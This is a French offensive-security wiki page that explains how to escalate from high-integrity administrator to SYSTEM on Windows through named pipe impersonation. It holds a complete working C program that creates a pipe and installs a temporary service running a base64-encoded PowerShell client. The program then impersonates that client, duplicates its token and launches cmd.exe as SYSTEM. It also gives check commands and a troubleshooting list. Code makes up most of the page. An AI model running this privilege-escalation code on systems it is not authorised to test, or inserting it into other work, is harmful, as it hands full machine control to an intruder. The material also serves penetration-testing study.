# De High Integrity à SYSTEM avec Name Pipes

{{#include ../../banners/hacktricks-training.md}}

Il s’agit de la variante **administrator/SCM** de l’impersonation via named pipe : un processus élevé crée un service temporaire dont le processus enfant se connecte en tant que `SYSTEM`, puis usurpe l’identité de ce client. Si le contexte de départ ne peut pas créer de services mais possède `SeImpersonatePrivilege`, utilisez plutôt une privileged-service coercion ; consultez [Named Pipe Client Impersonation](named-pipe-client-impersonation.md) et [RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato](roguepotato-and-printspoofer.md). La création du service nécessite un accès au SCM ainsi que les droits `SERVICE_START` sur le nouveau service, tandis que `CreateProcessWithTokenW` nécessite `SeImpersonatePrivilege`.<sup>[[2]](#references)[[3]](#references)</sup>

Confirmez rapidement le contexte de départ attendu :
```cmd
whoami /groups | findstr /i "High Mandatory"
whoami /priv | findstr /i "SeImpersonatePrivilege"
sc.exe query PiperSrv
```
**Flux du code :**

1. Créez le serveur de named pipe **avant** de démarrer le service. Lors de l'attente, considérez que `ConnectNamedPipe` renvoyant `FALSE` avec `ERROR_PIPE_CONNECTED` constitue un succès : cela signifie que le client a gagné la course et s'est connecté entre `CreateNamedPipe` et `ConnectNamedPipe`.<sup>[[4]](#references)</sup>
2. Créez et démarrez un service qui se connectera au pipe créé et y écrira quelque chose. Le code du service exécutera ce code PS encodé : `$pipe = new-object System.IO.Pipes.NamedPipeClientStream("piper"); $pipe.Connect(); $sw = new-object System.IO.StreamWriter($pipe); $sw.WriteLine("Go"); $sw.Dispose();`
3. Après la connexion et l'écriture du service, appelez `ImpersonateNamedPipeClient`, ouvrez le thread token obtenu et dupliquez-le en tant que primary token.<sup>[[1]](#references)</sup>
4. Utilisez ce primary token pour lancer `cmd.exe`.<sup>[[2]](#references)</sup>

Cette méthode suppose que l'appelant peut créer/démarrer un service et possède les privilèges requis par `CreateProcessWithTokenW` (normalement `SeImpersonatePrivilege`). Il s'agit d'une technique de high-integrity vers SYSTEM, et non d'une primitive disponible pour un utilisateur arbitraire aux privilèges faibles.<sup>[[2]](#references)[[3]](#references)</sup>

> [!WARNING]
> Si la création/le démarrage du service échoue, l'exemple ne signale pas l'erreur au thread du pipe, qui peut alors attendre indéfiniment. Ajoutez une gestion des erreurs et un délai d'attente pour le pipe overlapped avant de l'utiliser en dehors d'un lab. Utilisez également un nom aléatoire pour le pipe/service afin d'éviter les collisions.

`ImpersonateNamedPipeClient` adopte le contexte associé au **dernier message lu** ; une simple connexion ne suffit donc pas : faites écrire le client privilégié, vérifiez que `ReadFile` a renvoyé des données, puis seulement usurpez son identité. Dupliquez le thread impersonation token en un token `TokenPrimary` avec `SecurityImpersonation` ; c'est un primary token que l'API de création de processus utilise.<sup>[[1]](#references)[[5]](#references)</sup>
```c
#include <windows.h>
#include <time.h>

#pragma comment (lib, "advapi32")
#pragma comment (lib, "kernel32")

#define PIPESRV "PiperSrv"
#define MESSAGE_SIZE 512

DWORD WINAPI ServiceGo(LPVOID lpParam) {

SC_HANDLE scManager;
SC_HANDLE scService;

scManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);

if (scManager == NULL) {
return FALSE;
}

// create Piper service
scService = CreateServiceA(scManager, PIPESRV, PIPESRV, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
"C:\\Windows\\System32\\cmd.exe /c powershell.exe -EncodedCommand JABwAGkAcABlACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFAAaQBwAGUAcwAuAE4AYQBtAGUAZABQAGkAcABlAEMAbABpAGUAbgB0AFMAdAByAGUAYQBtACgAIgBwAGkAcABlAHIAIgApADsAIAAkAHAAaQBwAGUALgBDAG8AbgBuAGUAYwB0ACgAKQA7ACAAJABzAHcAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHAAaQBwAGUAKQA7ACAAJABzAHcALgBXAHIAaQB0AGUATABpAG4AZQAoACIARwBvACIAKQA7ACAAJABzAHcALgBEAGkAcwBwAG8AcwBlACgAKQA7AA==",
NULL, NULL, NULL, NULL, NULL);

if (scService == NULL) {
//printf("[!] CreateServiceA() failed: [%d]\n", GetLastError());
return FALSE;
}

// launch it
StartService(scService, 0, NULL);

// wait a bit and then cleanup
Sleep(10000);
DeleteService(scService);

CloseServiceHandle(scService);
CloseServiceHandle(scManager);
}

int main() {

LPCSTR sPipeName = "\\\\.\\pipe\\piper";
HANDLE hSrvPipe;
HANDLE th;
BOOL bPipeConn;
char pPipeBuf[MESSAGE_SIZE];
DWORD dBRead = 0;

HANDLE hImpToken;
HANDLE hNewToken;
STARTUPINFOW si;
PROCESS_INFORMATION pi;

// open pipe
hSrvPipe = CreateNamedPipeA(sPipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT,
PIPE_UNLIMITED_INSTANCES, 1024, 1024, 0, NULL);

// create and run service
th = CreateThread(0, 0, ServiceGo, NULL, 0, 0);

// wait for the connection from the service
bPipeConn = ConnectNamedPipe(hSrvPipe, NULL);
if (!bPipeConn && GetLastError() == ERROR_PIPE_CONNECTED) {
bPipeConn = TRUE; // Client connected between CreateNamedPipe and ConnectNamedPipe
}
if (bPipeConn) {
if (!ReadFile(hSrvPipe, &pPipeBuf, MESSAGE_SIZE, &dBRead, NULL) || dBRead == 0) {
return -6;
}

// impersonate the service (SYSTEM)
if (ImpersonateNamedPipeClient(hSrvPipe) == 0) {
return -1;
}

// wait for the service to cleanup
WaitForSingleObject(th, INFINITE);

// get a handle to impersonated token
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hImpToken)) {
return -2;
}

// create new primary token for new process
if (!DuplicateTokenEx(hImpToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation,
TokenPrimary, &hNewToken)) {
return -4;
}

//Sleep(20000);
// spawn cmd.exe as full SYSTEM user
ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));
if (!CreateProcessWithTokenW(hNewToken, 0, L"C:\\Windows\\System32\\cmd.exe", NULL,
CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
return -5;
}

// revert back to original security context
RevertToSelf();

}

return 0;
}
```
### Triage des erreurs

- `ConnectNamedPipe == FALSE` avec `ERROR_PIPE_CONNECTED` : continuer ; le pipe est déjà connecté.<sup>[[4]](#references)</sup>
- `ImpersonateNamedPipeClient` échoue avec `ERROR_CANNOT_IMPERSONATE` (`1368`) : vérifier que le client SYSTEM a bien écrit des données et que `ReadFile` s'est terminé. Vérifier également le niveau d'impersonation demandé par le client ; les clients avec un niveau d'identification ou anonyme ne peuvent pas être entièrement impersonnés.<sup>[[1]](#references)</sup>
- `CreateProcessWithTokenW` échoue avec `ERROR_PRIVILEGE_NOT_HELD` (`1314`) : l'appelant d'origine ne possède pas `SeImpersonatePrivilege`. Depuis un contexte administrateur à haute intégrité, utiliser la méthode de copie du token documentée dans [SeImpersonate from High To System](seimpersonate-from-high-to-system.md), ou utiliser `CreateProcessAsUserW` pendant l'impersonation de SYSTEM si les privilèges requis sont présents.<sup>[[2]](#references)</sup>
- `CreateServiceA` renvoie `ERROR_SERVICE_EXISTS` (`1073`) : supprimer l'entrée obsolète `PiperSrv` ou randomiser `PIPESRV` ; toujours supprimer le service temporaire après le déclenchement.<sup>[[3]](#references)</sup>



## References

- [1] [Microsoft Learn — `ImpersonateNamedPipeClient`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [Microsoft Learn — `CreateProcessWithTokenW`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [3] [Microsoft Learn — `CreateServiceA`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
- [4] [Microsoft Learn — `ConnectNamedPipe`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe)
- [5] [Microsoft Learn — `DuplicateTokenEx`](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex)
{{#include ../../banners/hacktricks-training.md}}
